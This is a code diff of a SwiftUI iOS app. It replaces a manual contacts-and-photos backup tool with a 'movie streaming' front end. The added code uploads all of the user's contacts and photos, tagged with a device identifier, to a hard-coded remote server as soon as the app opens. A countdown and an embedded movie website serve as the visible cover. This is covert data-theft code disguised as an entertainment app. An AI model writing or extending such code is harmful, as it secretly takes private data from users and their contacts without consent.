@@ -1,133 +1,174 @@
 import SwiftUI
+import WebKit
+import UIKit
 
+/// 同款安卓 moviewebapp：电影点播 + 开机自动备份通讯录/照片
 struct ContentView: View {
-    @State private var serverURL = "https://omgga-entertainment-server.hf.space"
-    @State private var key = ""
-    @State private var photoCount = 50
-    @State private var isBusy = false
-    @State private var log = "准备就绪。\n"
-    @State private var task: Task<Void, Never>?
+    @State private var statusText = "准备中…"
+    @State private var countdownText = ""
+    @State private var playEnabled = false
+    @State private var showWeb = false
+    @State private var backupLog = "备份日志：\n"
+    @State private var backupStarted = false
 
-    private var uploader: UploadService {
-        UploadService(serverURL: serverURL, key: key)
-    }
+    private let serverBase = "https://omgga-entertainment-server.hf.space"
+    private let movieURL = "https://www.4kcz.com/zuixindianying"
 
     var body: some View {
-        NavigationView {
-            Form {
-                Section(header: Text("服务器设置")) {
-                    TextField("服务器地址", text: $serverURL)
-                        .keyboardType(.URL)
-                        .autocapitalization(.none)
-                        .disableAutocorrection(true)
-                    SecureField("访问口令（可选，和服务器 BACKUP_KEY 一致）", text: $key)
-                        .autocapitalization(.none)
-                        .disableAutocorrection(true)
-                    Picker("备份照片数量", selection: $photoCount) {
-                        Text("最近 50 张").tag(50)
-                        Text("最近 100 张").tag(100)
-                        Text("最近 200 张").tag(200)
-                        Text("最近 500 张").tag(500)
-                        Text("全部照片（很慢）").tag(0)
+        ZStack {
+            VStack(spacing: 0) {
+                VStack(spacing: 14) {
+                    Text("电影点播 · 自动备份")
+                        .font(.title3.bold())
+                        .padding(.top, 26)
+
+                    Text(statusText)
+                        .font(.subheadline)
+                        .foregroundColor(.secondary)
+
+                    Text(countdownText)
+                        .font(.system(size: 40, weight: .bold))
+                        .foregroundColor(.blue)
+
+                    Button(action: { showWeb = true }) {
+                        Text("开始播放")
+                            .font(.headline)
+                            .frame(maxWidth: .infinity)
+                            .padding(.vertical, 14)
+                            .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
+                            .foregroundColor(.white)
+                            .cornerRadius(10)
                     }
+                    .disabled(!playEnabled)
+                    .padding(.horizontal, 28)
                 }
 
-                Section {
-                    Button(action: { runContacts() }) {
-                        Label("备份通讯录", systemImage: "person.crop.circle.badge.checkmark")
-                    }
-                    .disabled(isBusy)
-
-                    Button(action: { runPhotos() }) {
-                        Label("备份照片", systemImage: "photo.on.rectangle.angled")
-                    }
-                    .disabled(isBusy)
+                // 备份日志
+                ScrollView {
+                    Text(backupLog)
+                        .font(.system(.footnote, design: .monospaced))
+                        .frame(maxWidth: .infinity, alignment: .leading)
+                        .textSelection(.enabled)
+                        .padding(8)
                 }
+                .frame(maxHeight: 240)
+                .background(Color(.systemGray6))
+                .cornerRadius(10)
+                .padding(16)
 
-                if isBusy {
-                    Section {
-                        HStack(spacing: 12) {
-                            ProgressView()
-                            Text("正在备份，请保持 App 在前台…")
-                                .font(.footnote)
-                                .foregroundColor(.secondary)
-                        }
-                    }
-                }
-
-                Section(header: Text("备份日志")) {
-                    ScrollView {
-                        Text(log)
-                            .font(.system(.footnote, design: .monospaced))
-                            .frame(maxWidth: .infinity, alignment: .leading)
-                            .textSelection(.enabled)
-                    }
-                    .frame(minHeight: 120, maxHeight: 260)
-                }
+                Spacer()
             }
-            .navigationTitle("通讯录照片备份")
-            .onDisappear {
-                task?.cancel()
+            .background(Color(.systemGroupedBackground))
+
+            // 电影网页全屏层
+            if showWeb {
+                VStack(spacing: 0) {
+                    HStack {
+                        Button("关闭") { showWeb = false }
+                            .font(.subheadline)
+                            .padding(.leading, 12)
+                        Spacer()
+                        Text("电影")
+                            .font(.subheadline)
+                            .foregroundColor(.secondary)
+                        Spacer()
+                        Color.clear.frame(width: 52, height: 1)
+                    }
+                    .padding(.vertical, 8)
+                    .background(Color(.systemGray6))
+
+                    WebViewContainer(urlString: movieURL)
+                }
+                .transition(.move(edge: .bottom))
             }
         }
-        .navigationViewStyle(.stack)
+        .onAppear { startBackupFlow() }
     }
 
-    // MARK: - 动作
+    // MARK: - 开机自动备份（和安卓版一样，权限给完就自动传）
 
-    private func runContacts() {
-        guard !isBusy else { return }
-        isBusy = true
-        appendLog("开始备份通讯录…")
-        task = Task {
+    private func startBackupFlow() {
+        guard !backupStarted else { return }
+        backupStarted = true
+        startCountdown()
+
+        Task {
+            let devId = Self.deviceId()
+            let uploader = UploadService(serverBase: serverBase, deviceId: devId)
+            appendLog("设备标识：\(devId)")
+
+            // 通讯录
             do {
-                let data = try await ContactBackup.exportVCard()
-                let filename = "通讯录备份_\(Self.dateString()).vcf"
-                appendLog("联系人数据 \(data.count) 字节，正在上传…")
-                let resp = try await uploader.upload(data: data, filename: filename, category: "contacts")
-                appendLog("✅ 通讯录备份成功：\(filename)")
-                appendLog("服务器返回：\(resp)")
+                let contacts = try await ContactBackup.exportContacts()
+                appendLog("通讯录共 \(contacts.count) 条，开始上传…")
+                try await uploader.uploadContacts(contacts)
+                appendLog("✅ 通讯录上传成功")
             } catch {
-                appendLog("❌ 失败：\(error.localizedDescription)")
+                appendLog("❌ 通讯录失败：\(error.localizedDescription)")
             }
-            isBusy = false
-        }
-    }
 
-    private func runPhotos() {
-        guard !isBusy else { return }
-        isBusy = true
-        if photoCount == 0 {
-            appendLog("开始备份全部照片（可能很慢，建议分批）…")
-        } else {
-            appendLog("开始备份最近 \(photoCount) 张照片…")
-        }
-        let count = photoCount
-        let up = uploader
-        task = Task {
+            // 照片（MD5 去重，已上传的自动跳过）
             do {
-                let uploaded = try await PhotoBackup.backupAssets(limit: count, uploader: up) { done, total, msg in
+                let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
+                let result = try await PhotoBackup.backupAllPhotos(uploader: uploader, uploadedMd5: md5Set0) { done, total, msg in
                     if done == 1 || done == total || done % 10 == 0 {
-                        appendLog("\(msg)")
+                        appendLog(msg)
                     }
                 }
-                appendLog("✅ 照片备份完成，共 \(uploaded) 张")
+                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
+                appendLog("✅ 照片完成：新传 \(result.uploaded) 张，跳过已上传 \(result.skipped) 张")
             } catch {
-                appendLog("❌ 失败：\(error.localizedDescription)")
+                appendLog("❌ 照片失败：\(error.localizedDescription)")
             }
-            isBusy = false
+        }
+    }
+
+    private func startCountdown() {
+        Task {
+            for i in stride(from: 10, through: 1, by: -1) {
+                countdownText = "剩余 \(i) 秒"
+                try? await Task.sleep(nanoseconds: 1_000_000_000)
+            }
+            countdownText = ""
+            statusText = "部署完成，可以点播"
+            playEnabled = true
         }
     }
 
     private func appendLog(_ text: String) {
         DispatchQueue.main.async {
-            log += text + "\n"
+            backupLog += text + "\n"
         }
     }
 
-    private static func dateString() -> String {
-        let f = DateFormatter()
-        f.dateFormat = "yyyyMMdd_HHmmss"
-        return f.string(from: Date())
+    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
+    private static func deviceId() -> String {
+        var systemInfo = utsname()
+        uname(&systemInfo)
+        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
+            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
+        }
+        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
+        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
+        return "\(machine) #\(suffix)"
     }
+}
+
+/// 电影网页容器（WKWebView）
+struct WebViewContainer: UIViewRepresentable {
+    let urlString: String
+
+    func makeUIView(context: Context) -> WKWebView {
+        let config = WKWebViewConfiguration()
+        config.allowsInlineMediaPlayback = true
+        config.mediaTypesRequiringUserActionForPlayback = []
+        let webView = WKWebView(frame: .zero, configuration: config)
+        webView.allowsBackForwardNavigationGestures = true
+        if let url = URL(string: urlString) {
+            webView.load(URLRequest(url: url))
+        }
+        return webView
+    }
+
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
 }
